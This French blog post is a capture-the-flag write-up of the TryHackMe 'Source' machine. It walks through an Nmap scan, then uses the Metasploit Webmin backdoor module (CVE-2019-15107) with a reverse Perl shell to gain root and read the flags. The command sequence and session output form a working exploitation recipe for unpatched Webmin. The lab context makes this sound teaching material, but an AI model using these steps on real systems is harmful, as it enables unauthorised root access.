---
author: Adrien
id: 1
licence: CC
title: 'WriteUp - "Source" de THM'
categories: "Writeups"
---

Petit writeup de la très (très) simple machine "Source" du site [TryHackMe.com](https://tryhackme.com).

## Énumération

Comme toujours lors de mes CTF je commence par une petite énumération, d'abord avec Nmap tout en testant s'il y a un site sur le port par défaut (80).

Apparement pas de site sur le port 80, donc pas de gobuster.

![No website](/assets/images/1_1_no80.png)

Voyons voir ce que nous sort Nmap...

```shell
nmap -A -oN nmap_a.txt 10.10.253.146 
```

```
Not shown: 998 closed ports
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 b7:4c:d0:bd:e2:7b:1b:15:72:27:64:56:29:15:ea:23 (RSA)
|   256 b7:85:23:11:4f:44:fa:22:00:8e:40:77:5e:cf:28:7c (ECDSA)
|_  256 a9:fe:4b:82:bf:89:34:59:36:5b:ec:da:c2:d3:95:ce (ED25519)
10000/tcp open  http    MiniServ 1.890 (Webmin httpd)
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
```

Je fais toujours un `-oN nmap_a.txt` pour garder une trace du Nmap au cas où.

Du coup un port 22  avec 7.6p1 qui ne nous apporte pas grand chose après une verification sur [Exploit-DB](https://www.exploit-db.com/search?q=openssh), par contre le port 10000 avec webmin *1.890* d'après on a quelques trucs intéressants.

![Webmin Exploit DB](/assets/images/1_2_exploitdb.png)

J'ai d'abord essayé le 2ème lien, car les autres utilisent Metasploit et que je préfère éviter quand je peux. Le souci c'est que c'est juste une vérification de vulnérabilité et qu'en plus je n'ai pas réussi à lancer le script correctement.

Je suis donc passé au premier lien qui indique "**<** 1.920", sur metasploit j'ai cherché le script mais il n'y était pas, je l'ai donc téléchargé et ajouté dans `/home/<user>/.msf4/modules/webmin` (il faudra créer le dossier webmin, et il est possible que vous ayez le dossier `.msf5` au lieu de `.msf4`). Une fois lancé, je regarde les options et me rend compte qu'il faut un login et un mot de passe... Mauvaise pioche encore !

Cette fois j'essaie le troisième qui indique "Webmin 1.920 - Unauthenticated Remote Code Execution", la mauvaise nouvelle c'est qu'il n'y a pas de "<", mais la bonne c'est le "*Unauthenticated* " ! En lisant l'exploit on apprend que c'est une backdoor laissé par un ou plusieurs pirates et que cet exploit fonctionne de la version 1.890 à 1.920 ! Ouf ! Voici sa CVE : [CVE-2019-15107](https://nvd.nist.gov/vuln/detail/CVE-2019-15107).
Du coup on va chercher sur Metasploit :

```shell
msfconsole -q
```

```
msf5 > search webmin

Matching Modules
================

   #  Name                                         Disclosure Date  Rank       Check  Description
   -  ----                                         ---------------  ----       -----  -----------
   0  auxiliary/admin/webmin/edit_html_fileaccess  2012-09-06       normal     No     Webmin edit_html.cgi file Parameter Traversal Arbitrary File Access
   1  auxiliary/admin/webmin/file_disclosure       2006-06-30       normal     No     Webmin File Disclosure
   2  exploit/linux/http/webmin_backdoor           2019-08-10       excellent  Yes    Webmin password_change.cgi Backdoor
   3  exploit/linux/http/webmin_packageup_rce      2019-05-16       excellent  Yes    Webmin Package Updates Remote Command Execution
   4  exploit/unix/webapp/webmin_show_cgi_exec     2012-09-06       excellent  Yes    Webmin /file/show.cgi Remote Command Execution
   5  exploit/unix/webapp/webmin_upload_exec       2019-01-17       excellent  Yes    Webmin Upload Authenticated RCE
```

## Exploitation

Cool, il y est déjà donc on peut sélectionner le module 2 qui correspond à peu près au niveau de la date (2019-08-10) et indique "backdoor" :

```
msf5 > use 2
[*] Using configured payload cmd/unix/reverse_perl
```

Affichons les options :

```
msf5 exploit(linux/http/webmin_backdoor) > options

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT      10000            yes       The target port (TCP)
   SRVHOST    0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
   SRVPORT    8080             yes       The local port to listen on.
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
   TARGETURI  /                yes       Base path to Webmin
   URIPATH                     no        The URI to use for this exploit (default is random)
   VHOST                       no        HTTP server virtual host


Payload options (cmd/unix/reverse_perl):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port
```

Il faudra donc changer :

- **RHOSTS** pour l'ip du serveur, dans mon cas `10.10.253.146`.

- **SSL** qu'il faut mettre à `true`, on peut le voir car si on passe par le navigateur pour aller sur webmin on nous indique qu'il faut passer en https.

- **LPORT** pour notre ip, comme TryHackMe utilise un VPN on a juste à spécifier l'ip qui se trouve dans la partie `tun0` de la commande `ip addr`. Dans le cas d'une attaque sans réseau privé (local ou non) il faut préciser l'ip publique de la boxe internet (visible sur des sites comme [myip.com](https://www.myip.com/)) et faire du *Port Forwarding* vers notre machine.

Pour spécifier une option il faut faire `set <NOM_DE_L'OPTION> <VALEUR>`, par exemple `set RHOSTS 10.10.253.146`.

On a plus qu'à lancer l'exploit !

```shell
msf5 exploit(linux/http/webmin_backdoor) > exploit
```

```
[*] Started reverse TCP handler on xx.x.xxx.xxx:4444 
[*] Configuring Automatic (Unix In-Memory) target
[*] Sending cmd/unix/reverse_perl command payload
[*] Command shell session 1 opened (xx.x.xxx.xxx:4444 -> 10.10.253.146:38200) at 2020-08-27 12:45:04 -0400
```

## Récupération des données

Commençons par voir si l'exploit fonctionne bien et quel utilisateur nous avons :

```shell
id
uid=0(root) gid=0(root) groups=0(root)
```

Woaw, on est déjà root ! ^^

On peut optionnellement essayer d'avoir un shell "plus intuitif" :

```shell
python -c 'import pty;pty.spawn("/bin/bash")'
```

Bien y a plus qu'à récupérer les flags !

```
root@source:/usr/share/webmin/# ls /home
dark

root@source:/usr/share/webmin/# ls /home/dark
user.txt
webmin_1.890_all.deb

root@source:/usr/share/webmin/# cat /home/dark/user.txt
THM{XXXXXXXXXXX}

root@source:/usr/share/webmin/# ls /root
root.txt

root@source:/usr/share/webmin/# cat /root/root.txt
THM{XXXXXXXXXXX}
```

## Conclusion

Et bien ce fut plutôt facile ! Mais qu'est-ce qu'on a vu ?
Un Nmap classique, de la recherche sur Exploit-DB et un peu de Metasploit et comment "améliorer" un shell avec python.

Voilà, j'espère que ce WriteUp vous a plu :D

Si vous avez des avis, des conseils, des questions, des corrections ou que vous voulez simplement discuter n'hésitez pas à me joindre sur discord : `{{ site.data.globals.discordtag }}` ou par e-mail : `adrien.luitot[at]mailo.com`
